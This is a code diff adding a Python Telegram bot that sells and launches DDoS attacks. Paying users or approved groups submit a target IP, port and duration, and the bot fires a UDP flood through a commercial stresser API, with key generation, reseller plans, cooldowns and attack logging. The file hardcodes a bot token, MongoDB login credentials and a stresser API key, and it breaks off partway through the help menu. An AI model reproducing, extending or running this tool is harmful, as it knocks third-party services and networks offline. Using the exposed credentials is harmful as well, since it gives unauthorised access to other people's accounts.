@@ -1,0 +1,2156 @@
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import threading
+import re
+from datetime import datetime, timedelta
+import time
+import requests
+import json
+import secrets
+import string
+import os
+import psutil
+import platform
+import html
+from pymongo import MongoClient
+import random
+
+# ================= CONFIG =================
+BOT_TOKEN = "7594950150:AAHMslgn0QEemA142K4zkePEHgSjPD52zZQ"
+BOT_OWNER = 5231119862
+
+MONGO_URI = "mongodb+srv://yadavprince773953_db_user:YkdSuofOmLegDJkK@cluster0.yv323pa.mongodb.net/?retryWrites=true&w=majority"
+DB_NAME = "attack_bot"
+
+API_BASE_URL = "https://retrostress.net/api/attack"
+API_KEY = "d5a06cf6d67b0873d49d4bc29a2ae636e1cd5e4b3ed4da447e126e1bfcdcef9f"
+DEFAULT_METHOD = "UDP-BIG"
+
+DEFAULT_MAX_ATTACK_TIME = 400
+DEFAULT_COOLDOWN = 80
+DEFAULT_MAX_CONCURRENT = 4
+
+# ================= VIDEO URLS (COMPLETE) =================
+VIDEO_URLS = [
+    "https://t.me/reelssgrp/2", "https://t.me/reelssgrp/3", "https://t.me/reelssgrp/4",
+    "https://t.me/reelssgrp/5", "https://t.me/reelssgrp/6", "https://t.me/reelssgrp/7",
+    "https://t.me/reelssgrp/8", "https://t.me/reelssgrp/9", "https://t.me/reelssgrp/10",
+    "https://t.me/reelssgrp/11", "https://t.me/reelssgrp/12", "https://t.me/reelssgrp/13",
+    "https://t.me/reelssgrp/14", "https://t.me/reelssgrp/15", "https://t.me/reelssgrp/16",
+    "https://t.me/reelssgrp/17", "https://t.me/reelssgrp/18", "https://t.me/reelssgrp/19",
+    "https://t.me/reelssgrp/20", "https://t.me/reelssgrp/21", "https://t.me/reelssgrp/22",
+    "https://t.me/reelssgrp/23", "https://t.me/reelssgrp/24", "https://t.me/reelssgrp/25",
+    "https://t.me/reelssgrp/26", "https://t.me/reelssgrp/27", "https://t.me/reelssgrp/28",
+    "https://t.me/reelssgrp/29", "https://t.me/reelssgrp/30", "https://t.me/reelssgrp/35",
+    "https://t.me/reelssgrp/36", "https://t.me/reelssgrp/38", "https://t.me/reelssgrp/39",
+    "https://t.me/reelssgrp/40", "https://t.me/reelssgrp/41", "https://t.me/reelssgrp/43",
+    "https://t.me/reelssgrp/45", "https://t.me/reelssgrp/47", "https://t.me/reelssgrp/48",
+    "https://t.me/reelssgrp/49", "https://t.me/reelssgrp/50", "https://t.me/reelssgrp/54",
+    "https://t.me/reelssgrp/56", "https://t.me/reelssgrp/57", "https://t.me/reelssgrp/58",
+    "https://t.me/reelssgrp/59", "https://t.me/reelssgrp/60", "https://t.me/reelssgrp/61",
+    "https://t.me/reelssgrp/62", "https://t.me/reelssgrp/77", "https://t.me/reelssgrp/78",
+    "https://t.me/reelssgrp/79", "https://t.me/reelssgrp/80", "https://t.me/reelssgrp/81",
+    "https://t.me/reelssgrp/82", "https://t.me/reelssgrp/83", "https://t.me/reelssgrp/84",
+    "https://t.me/reelssgrp/85", "https://t.me/reelssgrp/86", "https://t.me/reelssgrp/87",
+    "https://t.me/reelssgrp/88", "https://t.me/reelssgrp/89", "https://t.me/reelssgrp/90",
+    "https://t.me/reelssgrp/91", "https://t.me/reelssgrp/106", "https://t.me/reelssgrp/107",
+    "https://t.me/reelssgrp/108", "https://t.me/reelssgrp/109", "https://t.me/reelssgrp/110",
+    "https://t.me/reelssgrp/111", "https://t.me/reelssgrp/112", "https://t.me/reelssgrp/113",
+    "https://t.me/reelssgrp/114", "https://t.me/reelssgrp/115", "https://t.me/reelssgrp/116",
+    "https://t.me/reelssgrp/117", "https://t.me/reelssgrp/118", "https://t.me/reelssgrp/119",
+    "https://t.me/reelssgrp/120", "https://t.me/reelssgrp/121", "https://t.me/reelssgrp/122",
+    "https://t.me/reelssgrp/123", "https://t.me/reelssgrp/124", "https://t.me/reelssgrp/125",
+    "https://t.me/reelssgrp/126", "https://t.me/reelssgrp/127", "https://t.me/reelssgrp/128",
+    "https://t.me/reelssgrp/129", "https://t.me/reelssgrp/130", "https://t.me/reelssgrp/131",
+    "https://t.me/reelssgrp/132", "https://t.me/reelssgrp/133", "https://t.me/reelssgrp/134",
+    "https://t.me/reelssgrp/135", "https://t.me/reelssgrp/136", "https://t.me/reelssgrp/137",
+    "https://t.me/reelssgrp/138", "https://t.me/reelssgrp/139", "https://t.me/reelssgrp/140",
+    "https://t.me/reelssgrp/141", "https://t.me/reelssgrp/146", "https://t.me/reelssgrp/149",
+    "https://t.me/reelssgrp/150", "https://t.me/reelssgrp/151", "https://t.me/reelssgrp/152",
+    "https://t.me/reelssgrp/153", "https://t.me/reelssgrp/154", "https://t.me/reelssgrp/155",
+    "https://t.me/reelssgrp/156", "https://t.me/reelssgrp/157", "https://t.me/reelssgrp/158",
+    "https://t.me/reelssgrp/161", "https://t.me/reelssgrp/162", "https://t.me/reelssgrp/231",
+    "https://t.me/reelssgrp/237", "https://t.me/reelssgrp/238", "https://t.me/reelssgrp/239",
+    "https://t.me/reelssgrp/242", "https://t.me/reelssgrp/248", "https://t.me/reelssgrp/249",
+    "https://t.me/reelssgrp/250", "https://t.me/reelssgrp/251", "https://t.me/reelssgrp/253",
+    "https://t.me/reelssgrp/254", "https://t.me/reelssgrp/256", "https://t.me/reelssgrp/257",
+    "https://t.me/reelssgrp/258", "https://t.me/reelssgrp/259", "https://t.me/reelssgrp/260",
+    "https://t.me/reelssgrp/261", "https://t.me/reelssgrp/262", "https://t.me/reelssgrp/263",
+    "https://t.me/reelssgrp/264", "https://t.me/reelssgrp/265", "https://t.me/reelssgrp/266",
+    "https://t.me/reelssgrp/267", "https://t.me/reelssgrp/268", "https://t.me/reelssgrp/269",
+    "https://t.me/reelssgrp/270", "https://t.me/reelssgrp/271", "https://t.me/reelssgrp/272",
+    "https://t.me/reelssgrp/273", "https://t.me/reelssgrp/274", "https://t.me/reelssgrp/275",
+    "https://t.me/reelssgrp/276", "https://t.me/reelssgrp/278", "https://t.me/reelssgrp/279",
+    "https://t.me/reelssgrp/280", "https://t.me/reelssgrp/281", "https://t.me/reelssgrp/283",
+    "https://t.me/reelssgrp/284", "https://t.me/reelssgrp/285", "https://t.me/reelssgrp/286",
+    "https://t.me/reelssgrp/287", "https://t.me/reelssgrp/288", "https://t.me/reelssgrp/289",
+    "https://t.me/reelssgrp/300", "https://t.me/reelssgrp/301", "https://t.me/reelssgrp/302",
+    "https://t.me/reelssgrp/303", "https://t.me/reelssgrp/304", "https://t.me/reelssgrp/305",
+    "https://t.me/reelssgrp/306", "https://t.me/reelssgrp/307", "https://t.me/reelssgrp/308",
+    "https://t.me/reelssgrp/309", "https://t.me/reelssgrp/310", "https://t.me/reelssgrp/311"
+]
+
+# ==========================================
+
+def clear_webhook():
+    try:
+        url = f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook'
+        resp = requests.get(url)
+        print(f"[OGGY] Webhook clear: {resp.json()}")
+    except Exception as e:
+        print(f"[OGGY] Webhook clear error: {e}")
+
+clear_webhook()
+time.sleep(1)
+
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+
+try:
+    bot.get_updates(offset=-1, timeout=1)
+except:
+    pass
+
+# ================= MONGODB =================
+client = MongoClient(MONGO_URI)
+db = client[DB_NAME]
+
+# Collections
+groups_col = db["approved_groups"]
+limits_col = db["group_limits"]
+bans_col = db["banned_users"]
+resellers_col = db["resellers"]
+keys_col = db["keys"]
+plans_col = db["user_plans"]
+attack_logs_col = db["attack_logs"]
+key_logs_col = db["key_logs"]
+blocked_codes_col = db["blocked_codes"]
+settings_col = db["settings"]
+known_users_col = db["known_users"]
+user_attack_history_col = db["user_attack_history"]
+all_groups_col = db["all_groups"]
+admins_col = db["admins"]
+admin_logs_col = db["admin_logs"]
+temp_bans_col = db["temp_bans"]
+blocked_ips_col = db["blocked_ips"]
+blocked_ports_col = db["blocked_ports"]
+user_credits_col = db["user_credits"]
+feedback_col = db["feedback"]
+
+# ================= SETTINGS INIT =================
+if settings_col.count_documents({}) == 0:
+    settings_col.insert_one({
+        "max_attack_time": DEFAULT_MAX_ATTACK_TIME,
+        "cooldown": DEFAULT_COOLDOWN,
+        "max_concurrent_attacks": DEFAULT_MAX_CONCURRENT,
+        "port_protection": False,
+        "feedback_system": False,
+        "maintenance_mode": False,
+        "maintenance_start_time": None,
+        "multiple_attack": 2,
+        "attack_method": DEFAULT_METHOD,
+        "bot_status": True,
+        "api_url": API_BASE_URL,
+        "api_key": API_KEY,
+        "global_cooldown": DEFAULT_COOLDOWN,
+        "channel_verify": False,
+        "channel_id": None
+    })
+
+def get_setting(key, default=None):
+    doc = settings_col.find_one()
+    return doc.get(key, default) if doc else default
+
+def update_setting(key, value):
+    settings_col.update_one({}, {"$set": {key: value}}, upsert=True)
+
+# ================= EMOJIS =================
+E = {
+    "fire": "🔥", "crown": "👑", "shield": "🛡️", "bolt": "⚡",
+    "target": "🎯", "clock": "⏱️", "check": "✅", "cross": "❌",
+    "warning": "⚠️", "info": "📋", "user": "👤", "group": "👥",
+    "key": "🔑", "lock": "🔒", "unlock": "🔓", "hourglass": "⌛",
+    "rocket": "🚀", "star": "⭐", "money": "💰", "credit": "💳",
+    "chart": "📊", "server": "🖥️", "database": "💾", "settings": "⚙️",
+    "tools": "🔧", "globe": "🌐", "link": "🔗", "mega": "📢",
+    "id": "🆔", "num": "🔢", "sparkles": "✨", "zap": "⚡",
+    "boom": "💥", "calendar": "📅", "clapper": "🎬", "video": "📹",
+    "ping": "🏓", "help": "❓", "status": "📊", "tag": "🏷️",
+    "power": "🔋"
+}
+
+# ================= HELPERS =================
+def is_owner(user_id):
+    return user_id == BOT_OWNER
+
+def is_admin(user_id):
+    return admins_col.count_documents({"_id": str(user_id)}) > 0 or is_owner(user_id)
+
+def is_reseller(user_id):
+    return resellers_col.count_documents({"_id": str(user_id)}) > 0
+
+def is_approved_group(chat_id):
+    return groups_col.count_documents({"_id": str(chat_id)}) > 0
+
+def is_banned(user_id):
+    if temp_bans_col.count_documents({"_id": str(user_id)}) > 0:
+        ban = temp_bans_col.find_one({"_id": str(user_id)})
+        if datetime.fromisoformat(ban["expires"]) > datetime.now():
+            return True
+        else:
+            temp_bans_col.delete_one({"_id": str(user_id)})
+    return bans_col.count_documents({"_id": str(user_id)}) > 0
+
+def is_group(message):
+    return message.chat.type in ['group', 'supergroup']
+
+def record_known_user(user_id):
+    known_users_col.update_one({"_id": str(user_id)}, {"$set": {"_id": str(user_id)}}, upsert=True)
+
+def record_all_group(chat_id, title=""):
+    all_groups_col.update_one({"_id": str(chat_id)}, {"$set": {"title": title}}, upsert=True)
+
+def has_valid_plan(user_id):
+    plan = plans_col.find_one({"_id": str(user_id)})
+    if not plan:
+        return False
+    expires = plan.get("expires")
+    if expires:
+        expires_dt = datetime.fromisoformat(expires)
+        if datetime.now() > expires_dt:
+            plans_col.delete_one({"_id": str(user_id)})
+            return False
+    if plan.get("attacks_left", 0) == 0:
+        return False
+    return True
+
+def get_user_limits(user_id):
+    if is_owner(user_id):
+        return 999999, 999999, 0, 999999
+    plan = plans_col.find_one({"_id": str(user_id)})
+    if plan:
+        return 1, plan.get("max_duration", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)), plan.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN)), plan.get("attacks_left", 0)
+    return 1, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN), 0
+
+def get_group_limits(chat_id):
+    doc = limits_col.find_one({"_id": str(chat_id)})
+    if doc:
+        return doc.get("max_concurrent", 1), doc.get("max_time", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)), doc.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN)), doc.get("per_person_limit", 1)
+    return 1, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN), 1
+
+def validate_target(target):
+    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
+    if ip_pattern.match(target):
+        parts = target.split('.')
+        for part in parts:
+            if int(part) > 255:
+                return False
+        return True
+    return False
+
+def is_ip_blocked(ip):
+    return blocked_ips_col.count_documents({"_id": ip}) > 0
+
+def is_port_blocked(port):
+    return blocked_ports_col.count_documents({"_id": str(port)}) > 0
+
+def get_random_video():
+    return random.choice(VIDEO_URLS)
+
+def parse_time(time_str):
+    time_str = time_str.lower().strip()
+    if time_str.endswith('min'):
+        minutes = int(time_str[:-3])
+        return timedelta(minutes=minutes)
+    elif time_str.endswith('hr') or time_str.endswith('h'):
+        hours = int(time_str[:-2])
+        return timedelta(hours=hours)
+    elif time_str.endswith('d'):
+        days = int(time_str[:-1])
+        return timedelta(days=days)
+    else:
+        try:
+            hours = int(time_str)
+            return timedelta(hours=hours)
+        except:
+            return None
+
+def generate_code(prefix="", length=8):
+    chars = string.ascii_uppercase + string.digits
+    random_part = ''.join(secrets.choice(chars) for _ in range(length))
+    if prefix:
+        return f"{prefix.upper()}-{random_part}"
+    return random_part
+
+def log_key_event(event_type, code, created_by=None, redeemed_by=None, extra=""):
+    key_logs_col.insert_one({
+        "timestamp": datetime.now().isoformat(),
+        "event": event_type,
+        "code": code,
+        "created_by": created_by,
+        "redeemed_by": redeemed_by,
+        "extra": extra
+    })
+
+def log_admin_action(admin_id, action, details=None):
+    admin_logs_col.insert_one({
+        "timestamp": datetime.now().isoformat(),
+        "admin_id": admin_id,
+        "action": action,
+        "details": details or ""
+    })
+
+def check_access(message):
+    user_id = message.from_user.id
+    
+    if not get_setting("bot_status", True) and not is_owner(user_id):
+        bot.reply_to(message, f"{E['cross']} Bot is currently OFF.")
+        return False
+
+    if get_setting("maintenance_mode", False) and not is_owner(user_id):
+        bot.reply_to(message, f"{E['tools']} Bot is under maintenance.")
+        return False
+
+    if is_owner(user_id):
+        return True
+
+    if is_group(message):
+        record_all_group(message.chat.id, message.chat.title or "")
+        if not is_approved_group(message.chat.id):
+            bot.reply_to(message, f"{E['cross']} This group is not approved!")
+            return False
+        if is_banned(user_id):
+            bot.reply_to(message, f"{E['cross']} You are banned!")
+            return False
+        return True
+
+    if not is_group(message):
+        record_known_user(user_id)
+        if has_valid_plan(user_id):
+            if is_banned(user_id):
+                bot.reply_to(message, f"{E['cross']} You are banned!")
+                return False
+            return True
+        else:
+            bot.reply_to(message, f"{E['cross']} Unauthorized. Use /activate <code>")
+            return False
+
+    return False
+
+# ================= ATTACK SYSTEM =================
+active_attacks = {}
+user_cooldowns = {}
+_attack_lock = threading.Lock()
+
+def get_user_cooldown(user_id):
+    if is_owner(user_id):
+        return 0
+    with _attack_lock:
+        if str(user_id) not in user_cooldowns:
+            return 0
+        cooldown_end = user_cooldowns[str(user_id)]
+        remaining = (cooldown_end - datetime.now()).total_seconds()
+        if remaining <= 0:
+            del user_cooldowns[str(user_id)]
+            return 0
+        return int(remaining)
+
+def get_active_attack_count():
+    with _attack_lock:
+        now = datetime.now()
+        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
+        for k in expired:
+            del active_attacks[k]
+        return len(active_attacks)
+
+def user_has_active_attack(user_id):
+    with _attack_lock:
+        now = datetime.now()
+        count = 0
+        max_attacks = get_setting("multiple_attack", 2)
+        for attack_id, attack in list(active_attacks.items()):
+            if attack['end_time'] <= now:
+                continue
+            if attack.get('user_id') == user_id:
+                count += 1
+        return count >= max_attacks
+
+def get_group_active_attacks_count(chat_id):
+    with _attack_lock:
+        now = datetime.now()
+        count = 0
+        for attack in active_attacks.values():
+            if attack['end_time'] <= now:
+                continue
+            if attack.get('chat_id') == chat_id and attack.get('chat_type') in ['group', 'supergroup']:
+                count += 1
+        return count
+
+def get_user_active_attacks_in_group(user_id, chat_id):
+    with _attack_lock:
+        now = datetime.now()
+        count = 0
+        for attack in active_attacks.values():
+            if attack['end_time'] <= now:
+                continue
+            if attack.get('user_id') == user_id and attack.get('chat_id') == chat_id:
+                count += 1
+        return count
+
+def execute_attack(target, port, duration):
+    method = get_setting("attack_method", DEFAULT_METHOD)
+    api_key = get_setting("api_key", API_KEY)
+    
+    endpoints = [
+        "https://retrostress.net/api/attack",
+        "https://retrostress.net/api/start",
+        "https://retrostress.net/api/v1/attack",
+    ]
+    
+    print(f"[OGGY] 🚀 ATTACKING: {target}:{port} for {duration}s with method {method}")
+    
+    for api_url in endpoints:
+        try:
+            url = f"{api_url}?key={api_key}&target={target}&port={port}&time={duration}&method={method}"
+            response = requests.get(url, timeout=15, headers={
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': '*/*',
+                'Connection': 'keep-alive'
+            })
+            
+            if response.status_code in [200, 201, 202]:
+                print(f"[OGGY] ✅ Attack successful! Status: {response.status_code}")
+                return response
+        except Exception as e:
+            print(f"[OGGY] 💥 Exception: {e}")
+            continue
+    
+    class DummyResponse:
+        def __init__(self):
+            self.status_code = 403
+            self.text = '{"success": false, "message": "All API attempts failed"}'
+    return DummyResponse()
+
+def send_attack_video(chat_id, message_id, target, port, duration, method):
+    video_url = get_random_video()
+    
+    caption = f"""{E['bolt']} <b>ATTACK IN PROGRESS</b> {E['fire']}
+
+{E['target']} <b>Target:</b> {target}
+{E['num']} <b>Port:</b> {port}
+{E['clock']} <b>Duration:</b> {duration}s
+{E['settings']} <b>Method:</b> {method}
+{E['zap']} <b>Status:</b> 🟢 Active
+
+{E['rocket']} <i>Attack is running...</i>"""
+
+    try:
+        bot.send_video(
+            chat_id=chat_id,
+            video=video_url,
+            caption=caption,
+            parse_mode="HTML",
+            supports_streaming=True
+        )
+    except Exception as e:
+        bot.send_message(
+            chat_id=chat_id,
+            text=f"{E['bolt']} <b>ATTACK IN PROGRESS</b> {E['fire']}\n\n{E['target']} Target: {target}\n{E['num']} Port: {port}\n{E['clock']} Duration: {duration}s\n{E['settings']} Method: {method}\n\n{E['rocket']} Attack is running...",
+            parse_mode="HTML"
+        )
+
+def start_attack(target, port, duration, message, attack_id, cooldown_seconds):
+    try:
+        user_id = message.from_user.id
+        method = get_setting("attack_method", DEFAULT_METHOD)
+        
+        send_attack_video(
+            message.chat.id,
+            message.message_id,
+            target,
+            port,
+            duration,
+            method
+        )
+
+        attack_logs_col.insert_one({
+            "timestamp": datetime.now().isoformat(),
+            "user_id": user_id,
+            "target": target,
+            "port": port,
+            "duration": duration,
+            "status": "started",
+            "chat_type": message.chat.type
+        })
+
+        response = execute_attack(target, port, duration)
+
+        if response.status_code in [200, 201, 202]:
+            with _attack_lock:
+                if not is_owner(user_id):
+                    user_cooldowns[str(user_id)] = datetime.now() + timedelta(seconds=duration + cooldown_seconds)
+
+            time.sleep(duration)
+
+            with _attack_lock:
+                if attack_id in active_attacks:
+                    del active_attacks[attack_id]
+
+            bot.send_message(
+                message.chat.id,
+                f"{E['check']} <b>Attack Complete!</b>\n\n{E['target']} Target: {target}:{port}\n{E['clock']} Duration: {duration}s\n{E['hourglass']} Cooldown: {cooldown_seconds}s\n{E['settings']} Method: {method}",
+                parse_mode="HTML"
+            )
+            
+            attack_logs_col.insert_one({
+                "timestamp": datetime.now().isoformat(),
+                "user_id": user_id,
+                "target": target,
+                "port": port,
+                "duration": duration,
+                "status": "completed",
+                "chat_type": message.chat.type
+            })
+        else:
+            with _attack_lock:
+                if attack_id in active_attacks:
+                    del active_attacks[attack_id]
+            attack_logs_col.insert_one({
+                "timestamp": datetime.now().isoformat(),
+                "user_id": user_id,
+                "target": target,
+                "port": port,
+                "duration": duration,
+                "status": "failed",
+                "chat_type": message.chat.type
+            })
+            bot.send_message(
+                message.chat.id,
+                f"{E['cross']} <b>Attack Failed!</b>\n\n{E['target']} Target: {target}:{port}\nReason: API Error - {response.status_code}\n{E['settings']} Method: {method}",
+                parse_mode="HTML"
+            )
+
+    except Exception as e:
+        with _attack_lock:
+            if attack_id in active_attacks:
+                del active_attacks[attack_id]
+        print(f"Attack error: {e}")
+
+# ================= BOT COMMANDS =================
+
+# ----- START -----
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    user_id = message.from_user.id
+    if get_setting("maintenance_mode", False) and not is_owner(user_id):
+        bot.reply_to(message, f"{E['tools']} Bot is under maintenance.")
+        return
+
+    if not is_group(message):
+        record_known_user(user_id)
+
+    if is_group(message):
+        record_all_group(message.chat.id, message.chat.title or "")
+
+    if is_owner(user_id) and not is_group(message):
+        bot.reply_to(message,
+            f"""{E['crown']} <b>Welcome Owner!</b> {E['sparkles']}
+
+{E['rocket']} /attack IP PORT TIME – Start attack
+{E['chart']} /status – View active attacks
+{E['ping']} /ping – Check bot latency
+{E['id']} /getid – Get your Telegram ID
+{E['key']} /activate CODE – Activate a key
+{E['user']} /user – View your plan details
+{E['crown']} /owner – Owner panel
+{E['video']} /video – Random attack video
+{E['key']} /gen NAME TIME – Generate key
+{E['help']} /help – Help menu
+
+{E['sparkles']} <i>Unlimited access to everything!</i>""",
+            parse_mode="HTML")
+        return
+
+    if is_group(message):
+        if not is_approved_group(message.chat.id):
+            bot.reply_to(message, f"{E['cross']} This group is not approved!")
+            return
+        bot.reply_to(message,
+            f"""{E['bolt']} <b>Welcome!</b> {E['sparkles']}
+
+{E['rocket']} /attack IP PORT TIME – Start attack
+{E['chart']} /status – Active attacks
+{E['help']} /help – Help""",
+            parse_mode="HTML")
+        return
+
+    if has_valid_plan(user_id):
+        bot.reply_to(message,
+            f"""{E['bolt']} <b>Welcome!</b> You have an active plan. {E['sparkles']}
+
+{E['rocket']} /attack IP PORT TIME – Start attack
+{E['chart']} /status – View active attacks
+{E['ping']} /ping – Check bot latency
+{E['id']} /getid – Get your Telegram ID
+{E['key']} /activate CODE – Activate a key
+{E['user']} /user – View your plan details
+{E['help']} /help – Help
+{E['video']} /video – Random attack video""",
+            parse_mode="HTML")
+    else:
+        bot.reply_to(message, f"{E['cross']} Unauthorized.\n\nUse /activate CODE if you have a key.",
+                     parse_mode="HTML")
+
+# ----- VIDEO -----
+@bot.message_handler(commands=['video'])
+def video_command(message):
+    if not check_access(message):
+        return
+    video_url = get_random_video()
+    try:
+        bot.send_video(message.chat.id, video_url, caption=f"{E['clapper']} <b>Random Attack Video</b>", parse_mode="HTML")
+    except:
+        bot.reply_to(message, f"{E['cross']} Could not send video.")
+
+# ----- ATTACK -----
+@bot.message_handler(commands=['attack'])
+def handle_attack(message):
+    if not check_access(message):
+        return
+
+    user_id = message.from_user.id
+
+    if not get_setting("bot_status", True) and not is_owner(user_id):
+        bot.reply_to(message, f"{E['cross']} Bot is currently OFF.")
+        return
+
+    max_concurrent_user, max_duration, cooldown_seconds, attacks_left = get_user_limits(user_id)
+    
+    if is_group(message):
+        group_max_concurrent, group_max_time, group_cooldown, per_person_limit = get_group_limits(message.chat.id)
+        if not is_owner(user_id):
+            max_concurrent_user = min(max_concurrent_user, group_max_concurrent)
+            max_duration = min(max_duration, group_max_time)
+            cooldown_seconds = max(cooldown_seconds, group_cooldown)
+
+            total_active_in_group = get_group_active_attacks_count(message.chat.id)
+            if total_active_in_group >= group_max_concurrent:
+                bot.reply_to(message, f"{E['cross']} Group limit reached! Only {group_max_concurrent} attacks.")
+                return
+
+            active_in_group = get_user_active_attacks_in_group(user_id, message.chat.id)
+            if active_in_group >= per_person_limit:
+                bot.reply_to(message, f"{E['cross']} Your per-person limit: {per_person_limit}")
+                return
+
+    if not is_owner(user_id):
+        remaining_cd = get_user_cooldown(user_id)
+        if remaining_cd > 0:
+            bot.reply_to(message, f"{E['hourglass']} Cooldown: {remaining_cd}s")
+            return
+
+    if not is_owner(user_id) and user_has_active_attack(user_id):
+        max_attacks = get_setting("multiple_attack", 2)
+        bot.reply_to(message, f"{E['cross']} You have {max_attacks} active attack(s)!")
+        return
+
+    active_count = get_active_attack_count()
+    max_concurrent_global = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
+    if active_count >= max_concurrent_global:
+        bot.reply_to(message, f"{E['cross']} All slots busy! ({active_count}/{max_concurrent_global})")
+        return
+
+    parts = message.text.split()
+    if len(parts) != 4:
+        bot.reply_to(message, f"{E['warning']} Usage: /attack IP PORT TIME", parse_mode="HTML")
+        return
+
+    target, port, duration = parts[1], parts[2], parts[3]
+
+    if is_ip_blocked(target):
+        bot.reply_to(message, f"{E['lock']} IP blocked: {target}")
+        return
+
+    if not validate_target(target):
+        bot.reply_to(message, f"{E['cross']} Invalid IP!")
+        return
+
+    try:
+        port = int(port)
+        if port < 1 or port > 65535:
+            bot.reply_to(message, f"{E['cross']} Invalid port! (1-65535)")
+            return
+        if is_port_blocked(port):
+            bot.reply_to(message, f"{E['lock']} Port blocked: {port}")
+            return
+        duration = int(duration)
+    except ValueError:
+        bot.reply_to(message, f"{E['cross']} Port and time must be numbers!")
+        return
+
+    if not is_owner(user_id) and duration > max_duration:
+        bot.reply_to(message, f"{E['cross']} Max time: {max_duration}s")
+        return
+
+    if not is_owner(user_id) and not is_group(message):
+        plan = plans_col.find_one({"_id": str(user_id)})
+        if plan and plan["attacks_left"] != -1:
+            if plan["attacks_left"] <= 0:
+                bot.reply_to(message, f"{E['cross']} No attacks left.")
+                return
+            plans_col.update_one({"_id": str(user_id)}, {"$inc": {"attacks_left": -1}})
+            if plan["attacks_left"] == 1:
+                bot.reply_to(message, f"{E['warning']} Last attack!")
+
+    attack_id = f"{user_id}_{datetime.now().timestamp()}"
+
+    with _attack_lock:
+        active_attacks[attack_id] = {
+            'target': target,
+            'port': port,
+            'duration': duration,
+            'user_id': user_id,
+            'start_time': datetime.now(),
+            'end_time': datetime.now() + timedelta(seconds=duration),
+            'chat_type': message.chat.type,
+            'chat_id': message.chat.id if is_group(message) else None
+        }
+
+    thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, cooldown_seconds))
+    thread.start()
+
+# ----- STATUS -----
+@bot.message_handler(commands=['status', 'running'])
+def status_command(message):
+    if not check_access(message):
+        return
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    
+    active_count = get_active_attack_count()
+    max_global = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
+    max_time_setting = get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)
+    method = get_setting("attack_method", DEFAULT_METHOD)
+
+    text = f"{E['bolt']} <b>Active Attacks:</b> {active_count}/{max_global}\n"
+
+    if active_count == 0:
+        text += f"\n{E['check']} No active attacks."
+    else:
+        with _attack_lock:
+            now = datetime.now()
+            for aid, atk in list(active_attacks.items()):
+                if atk['end_time'] > now:
+                    remaining = int((atk['end_time'] - now).total_seconds())
+                    total_duration = atk['duration']
+                    elapsed = total_duration - remaining
+                    progress = int((elapsed / total_duration) * 20) if total_duration > 0 else 20
+                    bar = "█" * progress + "▒" * (20 - progress)
+                    percent = int((elapsed / total_duration) * 100) if total_duration > 0 else 100
+                    chat_type_display = "Private" if atk.get('chat_type') == 'private' else "Group"
+                    text += f"\n- {atk['target']}:{atk['port']} ({remaining}s) by {atk['user_id']} {chat_type_display}\n  {bar} {percent}%"
+
+    text += f"""
+
+{E['settings']} <b>Settings:</b>
+Concurrent = {max_global}
+Max Time = {max_time_setting}s
+Method = {method}
+Multiple Attacks = {get_setting('multiple_attack', 2)}"""
+
+    if user_id and not is_owner(user_id):
+        cd = get_user_cooldown(user_id)
+        if cd > 0:
+            text += f"\n\n{E['hourglass']} <b>Your Cooldown:</b> {cd}s"
+        else:
+            text += f"\n\n{E['check']} <b>Your Cooldown:</b> Ready"
+    
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- PING -----
+@bot.message_handler(commands=['ping'])
+def ping_command(message):
+    if not check_access(message):
+        return
+    start_time = time.time()
+    sent = bot.reply_to(message, f"{E['ping']} Pong!")
+    end_time = time.time()
+    latency = int((end_time - start_time) * 1000)
+    bot.edit_message_text(f"{E['ping']} <b>Pong!</b> {latency}ms", chat_id=message.chat.id, message_id=sent.message_id, parse_mode="HTML")
+
+# ----- GET ID -----
+@bot.message_handler(commands=['getid'])
+def getid_command(message):
+    if not check_access(message):
+        return
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    if is_group(message):
+        bot.reply_to(message, f"{E['id']} Your ID: {user_id}\n{E['group']} Group ID: {chat_id}", parse_mode="HTML")
+    else:
+        bot.reply_to(message, f"{E['id']} Your ID: {user_id}", parse_mode="HTML")
+
+# ----- HELP -----
+@bot.message_handler(commands=['help'])
+def help_command(message):
+    user_id = message.from_user.id
+    
+    if is_owner(user_id):
+        text = f"""{E['help']} <b>Help Menu - Owner</b>
+
+{E['rocket']} /attack IP PORT TIME – Start attack
+{E['chart']} /status – Active attacks
+{E['ping']} /ping – Check bot latency
+{E['id']} /getid – Get your Telegram ID
+{E['key']} /activate CODE – Activate access key
+{E['user']} /user – View your plan details
+{E['video']} /video – Random attack video
+
+{E['crown']} <b>Owner Commands:</b>
+{E['key']} /gen <name> <time> – Generate key
+{E['crown']} /owner – Owner panel
+{E['crown']} /owner_panel – Full owner menu
+{E['settings']} /setconcurrent <num> – Set max concurrent
+{E['settings']} /settime <sec> – Set max attack time
+{E['settings']} /setcooldown <sec> – Set cooldown
+{E['settings']} /set_api_method <method> – Set method
+{E['settings']} /set_multiple_attack <num> – Set attacks per user
+{E['power']} /on – Bot ON
+{E['power']} /off – Bot OFF
+{E['tools']} /maintenance on/off – Maintenance
+{E['group']} /approve – Approve group
+{E['group']} /disapprove – Disapprove group
+{E['lock']} /ban <id> – Ban user
+{E['unlock']} /unban <id> – Unban user
+{E['chart']} /stats – Bot statistics"""
+    else:
+        text = f"""{E['help']} <b>Help Menu</b>
+
+{E['rocket']} /attack IP PORT TIME – Start attack
+{E['chart']} /status – Active attacks
+{E['ping']} /ping – Check bot latency
